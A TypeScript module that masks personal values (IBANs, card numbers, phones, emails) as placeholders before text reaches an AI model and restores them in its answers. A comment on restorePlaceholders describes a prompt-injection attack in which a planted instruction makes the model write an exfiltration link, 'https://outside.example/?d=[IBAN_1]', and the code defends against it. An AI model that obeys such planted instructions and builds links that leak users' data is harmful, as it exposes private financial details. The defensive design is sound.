import { PLACEHOLDER_PATTERN, type AutoCategory, type HideCategory, type HideCounts, type HideMode, type Span } from "./categories";
import { mergeSpans } from "./spans";
import { escapeRegExp, fold, foldKey, originalRange } from "./normalize";

/** The person's choices for one message: active modes, and (Manual) values blurred or left visible. */
export type HideChoices = { modes: HideMode[]; blur: string[]; unblur: string[] };

/**
 * What is masked in a typed message:
 * - Automatic: detected passages of the categories the company masks, except those the person
 *   chose to leave visible (Manual).
 * - Manual: plus every passage the person blurred. A detected passage keeps its category; a free
 *   selection becomes "redacted".
 */
export function spansToMask(text: string, detected: Span[], autoCategories: ReadonlySet<AutoCategory>, choices: HideChoices): Span[] {
  const automatic = choices.modes.includes("automatic");
  const manual = choices.modes.includes("manual");
  const unblur = new Set(manual ? choices.unblur.map(foldKey) : []);
  const blur = manual ? choices.blur.map((b) => b.trim()).filter((b) => b.length > 0) : [];
  const blurKeys = new Set(blur.map(foldKey));
  const out: Span[] = [];
  for (const s of detected) {
    const key = foldKey(text.slice(s.start, s.end));
    if (blurKeys.has(key)) out.push(s);
    else if (automatic && s.category !== "redacted" && autoCategories.has(s.category) && !unblur.has(key)) out.push(s);
  }
  for (const value of blur) for (const range of findAll(text, value)) out.push({ ...range, category: "redacted" });
  return mergeSpans(out);
}

/** Documents mode (and memory passages): the categories the company masks, no manual choice. */
export function autoSpans(detected: Span[], autoCategories: ReadonlySet<AutoCategory>): Span[] {
  return detected.filter((s) => s.category !== "redacted" && autoCategories.has(s.category));
}

/** Every occurrence of `value` in `text`, ignoring accents, case and spacing. */
export function findAll(text: string, value: string): { start: number; end: number }[] {
  const key = foldKey(value);
  if (!key) return [];
  const f = fold(text);
  const pattern = new RegExp(escapeRegExp(key).replace(/ /g, "\\s+"), "gu");
  return [...f.folded.matchAll(pattern)].map((m) => originalRange(f, m.index, m.index + m[0].length));
}

/** The form of a value used to give it a stable placeholder ("FR76 3000…" and "FR763000…" are one IBAN). */
export function canonicalValue(category: HideCategory, value: string): string {
  switch (category) {
    case "iban":
      return value.replace(/[^A-Za-z0-9]/g, "").toUpperCase();
    case "card":
    case "phone":
      return value.replace(/\D/g, "");
    case "email":
      return value.trim().toLowerCase();
    default:
      return foldKey(value);
  }
}

/** Replaces each span by its placeholder. `placeholderOf` returns the placeholder of a (category, value). */
export function applyPlaceholders(
  text: string,
  spans: Span[],
  placeholderOf: (category: HideCategory, value: string) => string,
): { masked: string; counts: HideCounts } {
  const counts: HideCounts = {};
  let masked = "";
  let cursor = 0;
  for (const s of [...spans].sort((a, b) => a.start - b.start)) {
    if (s.start < cursor) continue;
    masked += text.slice(cursor, s.start) + placeholderOf(s.category, text.slice(s.start, s.end));
    counts[s.category] = (counts[s.category] ?? 0) + 1;
    cursor = s.end;
  }
  return { masked: masked + text.slice(cursor), counts };
}

/**
 * Puts the real values back in place of known placeholders; unknown ones are left as written.
 * A placeholder inside a link's address stays a placeholder: an instruction planted in a document could
 * otherwise make the AI write "https://outside.example/?d=[IBAN_1]" and one click would send the real
 * value away. `before` is the text that came just before (streamed answers), for the same check.
 */
export function restorePlaceholders(text: string, values: ReadonlyMap<string, string>, before = ""): string {
  if (values.size === 0) return text;
  return text.replace(PLACEHOLDER_PATTERN, (placeholder: string, _kind: string, _n: string, offset: number) => {
    const value = values.get(placeholder);
    if (value === undefined) return placeholder;
    return insideLinkAddress(lineBefore(before, text, offset)) ? placeholder : value;
  });
}

/** The text of the current line up to `offset` (only the part after the last line break matters). */
function lineBefore(before: string, text: string, offset: number): string {
  const inText = text.lastIndexOf("\n", offset - 1);
  if (inText !== -1) return text.slice(inText + 1, offset);
  return before.slice(before.lastIndexOf("\n") + 1) + text.slice(0, offset);
}

/**
 * Whether text written right after `line` belongs to a link's address: a web address, a "mailto:",
 * a Markdown link destination "](…" or "](<…" or a reference definition "[1]: <…". Plain string
 * searches only (no pattern that could take long on a very long line).
 */
export function insideLinkAddress(line: string): boolean {
  let start = line.length;
  while (start > 0 && !/\s/.test(line[start - 1])) start--;
  const word = line.slice(start).toLowerCase();
  if (word.includes("://") || word.includes("](") || word.includes("mailto:") || word.includes("www.")) return true;
  const open = line.lastIndexOf("<");
  if (open === -1 || line.indexOf(">", open) !== -1) return false;
  return line.slice(Math.max(0, open - 2), open) === "](" || /^[a-z][a-z0-9+.-]{0,31}:/i.test(line.slice(open + 1, open + 40)) || /^\s*\[[^\]]{1,200}\]:\s*$/.test(line.slice(0, open));
}

/**
 * Turns placeholder-shaped text that our masker did not write into an inert lookalike of the same
 * length ("[IBAN_1]" → "[IBAN 1]"), except the placeholders in `keep`. Applied to everything people
 * or documents put in front of the model, so nobody can type "[IBAN_1]" and get a value restored
 * that they were never shown (a colleague who joined a group conversation later, for example).
 */
export function neutralizePlaceholders(text: string, keep?: ReadonlySet<string>): string {
  return text.replace(PLACEHOLDER_PATTERN, (placeholder) => (keep?.has(placeholder) ? placeholder : placeholder.replace("_", " ")));
}

/**
 * Restores placeholders in a streamed answer. A placeholder can arrive in pieces ("[CLI" then
 * "ENT_1]"): a possible beginning is held back until it is complete.
 */
export class StreamRestorer {
  private buffer = "";
  /** The current line as the model wrote it (with placeholders), to recognise a link's address. */
  private line = "";

  /** `neutralizeOthers`: placeholders without a value here are made inert, so they cannot be restored later. */
  constructor(
    private readonly values: ReadonlyMap<string, string>,
    private readonly neutralizeOthers = false,
  ) {}

  private restore(text: string): string {
    const restored = restorePlaceholders(text, this.values, this.line);
    const lastBreak = text.lastIndexOf("\n");
    this.line = lastBreak === -1 ? this.line + text : text.slice(lastBreak + 1);
    return this.neutralizeOthers ? neutralizePlaceholders(restored) : restored;
  }

  push(delta: string): string {
    this.buffer += delta;
    const open = this.buffer.lastIndexOf("[");
    let cut = this.buffer.length;
    if (open !== -1 && this.buffer.length - open <= 16 && /^\[[A-Z]*_?\d*$/.test(this.buffer.slice(open))) cut = open;
    const out = this.buffer.slice(0, cut);
    this.buffer = this.buffer.slice(cut);
    return this.restore(out);
  }

  flush(): string {
    const out = this.restore(this.buffer);
    this.buffer = "";
    return out;
  }
}

/** Longest values first, so "Client A Nord" is replaced before "Client A". Whole words only. */
export function protectValues(text: string, values: ReadonlyMap<string, string>): string {
  let out = text;
  for (const [placeholder, value] of [...values].sort((a, b) => b[1].length - a[1].length)) {
    if (value.trim().length < 2) continue;
    const escaped = value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    // Never inside a placeholder already in the text ("[CLIENT_1]" when a client is called "Client").
    out = out.replace(new RegExp(`(?<![\\p{L}\\p{N}[])${escaped}(?![\\p{L}\\p{N}_])`, "giu"), placeholder);
  }
  return out;
}
